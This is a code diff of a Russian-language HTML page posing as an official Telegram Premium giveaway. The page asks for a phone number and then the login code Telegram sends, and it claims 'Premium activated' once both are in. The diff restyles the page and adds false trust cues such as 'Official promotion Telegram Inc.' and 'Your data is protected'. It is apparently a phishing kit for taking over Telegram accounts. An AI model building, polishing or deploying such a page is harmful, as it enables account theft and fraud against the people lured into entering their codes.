@@ -3,13 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Telegram Premium — Бесплатно</title>
+    <title>Telegram Premium — Бесплатная акция</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: var(--tg-theme-bg-color, #17212b);
+            background: var(--tg-theme-bg-color, #0a0f1a);
             color: var(--tg-theme-text-color, #ffffff);
             min-height: 100vh;
             display: flex;
@@ -17,18 +22,23 @@
             align-items: center;
             padding: 20px;
         }
+
         .container {
-            max-width: 450px;
+            max-width: 500px;
             width: 100%;
-            background: var(--tg-theme-secondary-bg-color, #1f2a36);
+            background: var(--tg-theme-secondary-bg-color, #1a2332);
             border-radius: 32px;
             padding: 28px 24px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.05);
         }
+
+        /* Шапка */
         .logo {
             text-align: center;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
+
         .logo-icon {
             width: 80px;
             height: 80px;
@@ -39,68 +49,138 @@
             justify-content: center;
             margin: 0 auto;
             font-size: 44px;
+            box-shadow: 0 4px 20px rgba(42, 107, 158, 0.3);
         }
+
         h1 {
             text-align: center;
-            font-size: 26px;
+            font-size: 28px;
             margin: 16px 0 8px;
+            background: linear-gradient(135deg, #fff, #8ba3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        .subtitle {
+
+        .badge {
             text-align: center;
-            color: #7e8c9e;
-            font-size: 14px;
-            margin-bottom: 28px;
-        }
-        .timer-box {
-            background: rgba(255,255,255,0.05);
+            background: rgba(42, 107, 158, 0.2);
+            display: inline-block;
+            width: auto;
+            margin: 0 auto 16px;
+            padding: 6px 14px;
             border-radius: 50px;
-            padding: 16px;
+            font-size: 12px;
+            color: #2a6b9e;
+            font-weight: 600;
+            border: 1px solid rgba(42, 107, 158, 0.3);
+        }
+
+        .badge span {
+            display: block;
+        }
+
+        /* Таймер */
+        .timer-box {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 60px;
+            padding: 20px;
             text-align: center;
             margin-bottom: 28px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
         }
+
         .timer-label {
             font-size: 12px;
-            color: #7e8c9e;
-            letter-spacing: 1px;
+            color: #8ba3b8;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
         }
+
         .timer {
-            font-size: 44px;
+            font-size: 52px;
             font-weight: bold;
             font-family: monospace;
-            letter-spacing: 4px;
+            letter-spacing: 6px;
+            color: #2a6b9e;
         }
+
+        /* Призы */
         .prizes {
             display: flex;
             gap: 12px;
             margin-bottom: 28px;
         }
+
         .prize {
             flex: 1;
-            background: rgba(255,255,255,0.03);
+            background: rgba(255, 255, 255, 0.03);
             border-radius: 20px;
-            padding: 12px;
+            padding: 14px 8px;
             text-align: center;
-            border: 1px solid rgba(255,255,255,0.05);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.2s;
         }
-        .prize-icon { font-size: 28px; margin-bottom: 8px; }
-        .prize-count { font-weight: bold; font-size: 18px; color: #ffd700; }
-        .prize-text { font-size: 11px; color: #7e8c9e; }
-        .input-group { margin-bottom: 16px; }
+
+        .prize-icon {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .prize-count {
+            font-weight: bold;
+            font-size: 18px;
+            color: #ffd700;
+        }
+
+        .prize-text {
+            font-size: 11px;
+            color: #8ba3b8;
+        }
+
+        /* Формы */
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
         .input-group input {
             width: 100%;
-            padding: 15px 18px;
+            padding: 16px 18px;
             background: var(--tg-theme-bg-color, #0e1621);
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 28px;
             font-size: 16px;
             color: var(--tg-theme-text-color, #ffffff);
             outline: none;
+            transition: all 0.2s;
         }
-        .input-group input:focus { border-color: #2a6b9e; }
-        .input-group input::placeholder { color: #5a6e80; }
+
+        .input-group input:focus {
+            border-color: #2a6b9e;
+            box-shadow: 0 0 0 2px rgba(42, 107, 158, 0.2);
+        }
+
+        .input-group input::placeholder {
+            color: #5a6e80;
+        }
+
         button {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background: linear-gradient(135deg, #2a6b9e, #1a4a6e);
             border: none;
             border-radius: 28px;
@@ -108,25 +188,17 @@
             font-weight: bold;
             color: white;
             cursor: pointer;
-            transition: opacity 0.2s;
+            transition: all 0.2s;
         }
-        button:active { opacity: 0.8; }
-        .step { display: none; }
-        .step.active { display: block; }
-        .loading { text-align: center; padding: 30px; }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255,255,255,0.2);
-            border-top-color: #2a6b9e;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 15px;
+
+        button:active {
+            transform: scale(0.98);
+            opacity: 0.9;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+
         .error {
-            background: rgba(220,50,50,0.15);
-            border: 1px solid rgba(220,50,50,0.4);
+            background: rgba(220, 50, 50, 0.15);
+            border: 1px solid rgba(220, 50, 50, 0.4);
             border-radius: 14px;
             padding: 12px;
             text-align: center;
@@ -134,19 +206,52 @@
             font-size: 13px;
             margin-bottom: 16px;
         }
+
+        .loading {
+            text-align: center;
+            padding: 30px;
+        }
+
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 3px solid rgba(42, 107, 158, 0.2);
+            border-top-color: #2a6b9e;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         .security {
             text-align: center;
             font-size: 11px;
             color: #5a6e80;
-            margin-top: 20px;
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .success-icon {
+            font-size: 64px;
+            text-align: center;
+            margin-bottom: 16px;
         }
     </style>
 </head>
 <body>
 <div class="container" id="app">
-    <div class="logo"><div class="logo-icon">🎁</div></div>
+    <div class="logo">
+        <div class="logo-icon">🎁</div>
+    </div>
+    <div style="text-align: center;">
+        <div class="badge"><span>🔥 Официальная акция</span></div>
+    </div>
     <h1>Telegram Premium</h1>
-    <div class="subtitle">3 месяца бесплатно</div>
+    <div style="text-align: center; margin-bottom: 24px; color: #8ba3b8;">3 месяца бесплатно</div>
 
     <div class="timer-box">
         <div class="timer-label">ДО КОНЦА АКЦИИ</div>
@@ -159,25 +264,32 @@
         <div class="prize"><div class="prize-icon">🔒</div><div class="prize-count">Безопасно</div><div class="prize-text">официально</div></div>
     </div>
 
-    <!-- ШАГ 1: НОМЕР -->
+    <!-- ШАГ 1: Номер -->
     <div id="step1" class="step active">
         <div class="input-group"><input type="tel" id="phone" placeholder="+7 999 123 45 67"></div>
-        <button onclick="sendCode()">Получить Premium</button>
+        <button onclick="sendCode()">🎁 Получить Premium</button>
     </div>
 
-    <!-- ШАГ 2: КОД -->
+    <!-- ШАГ 2: Код -->
     <div id="step2" class="step">
         <div class="input-group"><input type="text" id="code" placeholder="Введите код из Telegram"></div>
         <div id="errorMsg" class="error" style="display:none;"></div>
-        <button onclick="verifyCode()">Подтвердить</button>
+        <button onclick="verifyCode()">✅ Подтвердить</button>
+        <div class="security" style="margin-top:12px;">Код отправлен в Telegram</div>
     </div>
 
-    <!-- ШАГ 3: ЗАГРУЗКА -->
+    <!-- ШАГ 3: Загрузка -->
     <div id="step3" class="step">
-        <div class="loading"><div class="spinner"></div><div>Активация Premium...</div></div>
+        <div class="loading">
+            <div class="spinner"></div>
+            <div>Активация Premium...</div>
+        </div>
     </div>
 
-    <div class="security">🔒 Официальная акция Telegram Inc.</div>
+    <div class="security">
+        🔒 Telegram Inc. Официальная акция<br>
+        Ваши данные защищены
+    </div>
 </div>
 
 <script>
@@ -186,11 +298,18 @@
 
     let currentPhone = '';
     let time = 932;
-    setInterval(() => { if(time>0){ time--; let m=Math.floor(time/60); let s=time%60; document.getElementById('timer').innerText=`${m}:${s<10?'0'+s:s}`; } }, 1000);
+    setInterval(() => {
+        if (time > 0) {
+            time--;
+            let m = Math.floor(time / 60);
+            let s = time % 60;
+            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' + s : s}`;
+        }
+    }, 1000);
 
     async function sendCode() {
         let phone = document.getElementById('phone').value.trim();
-        if (!phone) return showError('Введите номер');
+        if (!phone) return showError('Введите номер телефона');
         currentPhone = phone;
         document.getElementById('step1').classList.remove('active');
         document.getElementById('step3').classList.add('active');
@@ -217,12 +336,15 @@
         });
         let data = await res.json();
         if (data.success) {
-            document.getElementById('step3').innerHTML = '<div class="loading"><div style="font-size:48px;">✅</div><div>Premium активирован!</div></div>';
-            setTimeout(() => { if(tg) tg.close(); else location.reload(); }, 2000);
+            document.getElementById('step3').innerHTML = '<div class="loading"><div class="success-icon">✅</div><div>Premium активирован!</div><div style="font-size:13px; margin-top:8px;">Спасибо за участие</div></div>';
+            setTimeout(() => {
+                if (tg) tg.close();
+                else location.reload();
+            }, 2000);
         } else {
             document.getElementById('step3').classList.remove('active');
             document.getElementById('step2').classList.add('active');
-            showError(data.error || 'Неверный код');
+            showError(data.error || 'Неверный код. Попробуйте ещё раз');
         }
     }
 
